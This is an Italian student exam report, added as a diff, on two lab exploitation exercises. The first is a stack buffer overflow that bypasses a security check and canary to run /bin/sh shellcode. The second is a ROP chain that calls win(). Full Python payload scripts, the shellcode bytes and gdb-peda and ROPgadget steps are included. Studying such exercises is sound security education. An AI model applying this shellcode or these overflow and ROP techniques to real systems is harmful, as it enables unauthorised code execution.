@@ -1,0 +1,160 @@
+Relazione Ghali Carolin 
+Relazione richiesta 1
+
+Nella richiesta 1 è richiesto di eseguire dello shellcode sfruttando la strcpy definite nella print function. Analizzando il codice notiamo subito la presenza di una funzione enable_security_check() che permette di abilitare un controllo di sicurezza, e di un'altra funzione disable_security_check che permette invece di disabilitarlo.
+Per poter eseguire la shell bisogna sfruttare la vulnerabilità all'interno della funzione print_function, per poterlo fare però è necessario disabilitare il controllo di sicurezza e successivamente oltrepassare il canarino. 
+
+Per disabilitare il controllo di sicurezza sfrutto la varibile *fp che viene eseguita nel main solo se il valore è diverso da NULL. L'obiettivo inizile è quindi quello di sovrascivere fp con l'indirizzo di disable_security_check. Successivamente, una volta entrati nella print_function con il controllo sicurezza disabilitato sarà necessario solamente superare il canarino e dopo la strcpy aggiungere l'indirizzo del buffer dst in cui verrà inserito lo shellcode.
+
+
+In primo luogo ho quindi ottenuto l'offset tra il buffer e l'EIP. Per farlo ho utilizzato peda lanciano i comandi
+
+- gdb ./bof
+- pattern create 300 file1
+- r < file1
+- pattern search 
+
+In questo modo peda mi permette di trovare la distanza dall'EIP che in questo caso è 273.
+
+L'exploit sarà quindi formato da 2 payload. 
+
+Nel payload1 ho inserito 10 nop, seguite dallo shellcode, seguite dal 136 nop. Il valore 136 è stato calcolato tramite peda, inserendo un valore nel pattern create inferiore a 300 (circa 150) in modo da non fare overflow sul EIP del main ma farlo su quello della print_function. Anche senza peda sarebbe comunque sufficiente sapere che generalmente tra il buffer e l'EIP sono presenti altri elementi come l'SFP etc che aumentano ognuno di 4 byte la distanza dall'EIP. 
+
+Dopo aver aggiunto l'offset di nop, ci troviamo sopra l'indirizzo dell'EIP a cui assegniamo l'indirizzo di inizio del buffer dst in cui è presente lo shellcode.
+
+Per poter creare il secondo payload è necessario calcolare un offset dato dalla grandezza iniziale del buffer (273) meno la lunghezza del payload1. Questo perché nella print function verrà copiato il contenuto del primo buffer nel secondo buffer quindi la lunghezza complessiva alla fine sarà di 273. 
+
+Nel secondo payload inseriamo un numero di B * offset seguito dall'indirizzo di disable address (ottenuto dalla stampa nel codice) che andrà a sovrascrivere l'fp permettendo di disabilitare il controllo di sicurezza.
+
+
+Il payload finale è quindo composto da payload1 + payload2.
+
+Quello che succede quando viene eseguito questo codice è quindi:
+ - B * offset
+ - sovrascrizione di fp con indirizzo di disable address e successiva esecuzione della funzione disable address
+ - esecuzione della print_function
+ - inserimento in dsr di 10 nop + shellcode 
+ - controllo di sicurezza disabilitato quindi si entra nella funzione con la strcpy
+ - offset di nop per riempire il buffer dst fino all'EIP superando il canarino
+ - indirizzo di inizio dst in cui è presente lo shellcode.
+ 
+Codice in python:
+
+import struct
+
+buffer_len = 273
+shellcode=(b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
+disable_address = struct.pack("I", 0x804852b)
+
+payload1 = '\x90' * 10   
+payload1 += shellcode 
+payload1 += '\x90' * (136- len(payload1)) #offset di 16
+payload1 += struct.pack("I", 0xbffff1c8)
+
+
+offset = buffer_len - (len(payload1))
+payload2 = "B" * (offset)
+payload2 += disable_address
+
+payload = payload1 + payload2
+
+with open("badfile", "wb") as f:
+	f.write(payload)
+
+
+Comando per l'esecuzione del codice:
+cat badfile - | ./bof
+
+
+Relazione richiesta 2
+
+L'obiettivo della richiesta 2 è invece quello di sfruttare la vulnerabiltà (gets del buffer) all'interno di vuln() per poter far stampare la string "Congratulation user you win".
+
+Per poter entrare nella vuln è necessario passare al codice almeno 2 argomenti, il primo di questi sarà appunto il nome utente che sarà quindi contenuto in argv[1].
+
+Successivamente una volta in vuln si fa buffer overflow sul buffer di 140. Per trovare la distanza dall'EIP utilizziamo nuovamente peda. 
+- gdb ./rop-exam
+- pattern create 200 file1
+- r a a < file1
+- pattern search 
+Troviamo cosi la distanza dall'EIP = 148. 
+
+Dopo aver fatto ciò è necessario recupare gli indirizzi delle variabili e delle funzioni che serviranno per utilizzare la tecnica ROP. 
+In particolare tramite peda con il comando 
+- p "nome funzione" 
+otteniamo l'indirizzo della funzione.
+
+Per trovare le variabili sempre con peda è necessario invece fare:
+- info variables "nome variabile"
+
+In questo caso la maggior parte delle variaibli venivano però stampate direttamente dal programma. 
+Gli indirizzi cosi ottenuti sono quindi quelli della join_string, str1, str2, str3, win, argv_addr (stampata da codice) e cpy_string.
+
+A questo punto per poter eseguire il ROP è necessario solamente ottenere l'indirizzo di una pop_pop_ret. Per farlo utilizzo ROPgadget lanciano da prompt il comando 
+
+	ROPgarget --binary rop-exam --only 'pop|ret'
+
+Questo comando mi restituisce tutt gli indirizzi delle pop ret prendendo in ingresso il binario rop-exam. In questo caso abbiamo bisogno di una pop_pop_ret perché ad ogni funzione verranno passati 2 parametri.
+
+Nello specifico quello che si vuole fare è creare un payload composto in primo luogo da 148 caratteri (A) che ci permettono di posizionarci all'inizio dell'EIP. 
+
+Questi vengono seguiti poi dall'indirizzo della funzione cpy_string, la pop_pop_ret e i valori di str3 e str1. Questo permette di copiare il contenuto di str1 in str3.
+
+Successivamente al payload vengono aggiunti gli indirzzi dell funzione join_string, seguiti sempre dalla pop pop ret e da str3 e argv. In questo modo il valore contenuto in argv[1] (nome utente) verrà copiato in str3.
+
+A questo punto, inseriamo un'altra volta l'indirizzo della join_string seguito da pop_pop_ret seguito da str3 e str2. In questo modo copieremo il valore di str2 in str3 formando all'interno di str3 la frase "congratulation user you win".
+
+Infine, inseriamo all'interno del payload l'indirizzo di win che permette di stampare il valore contenuto in str3.
+
+Codice in python:
+import struct
+import subprocess
+
+join_string = struct.pack("I", 0x804854c)
+str1 = struct.pack("I", 0x0804a060)
+str2 = struct.pack("I", 0x0804a084)
+str3 = struct.pack("I", 0x0804a0a0)
+pop_pop_ret = struct.pack("I", 0x080486aa)
+win = struct.pack("I", 0x804857e)
+copy_string = struct.pack("I", 0x804851a)
+argv_addr = struct.pack("I", 0xbffff585)
+
+p = 'A' * 148
+
+p += copy_string
+p += pop_pop_ret
+p += str3
+p += str1
+
+p += join_string
+p += pop_pop_ret
+p += str3
+p += argv_addr
+
+p += join_string
+p += pop_pop_ret
+p += str3
+p += str2
+
+p += win
+
+payload = p
+
+with open("badfile", "wb") as f:
+	f.write(payload) 
+
+
+Comando per l'esecuzione del codice:
+cat badfile - | ./rop-exam Carolin a
+
+
+
+
+
+
+
+
+
+
+
+
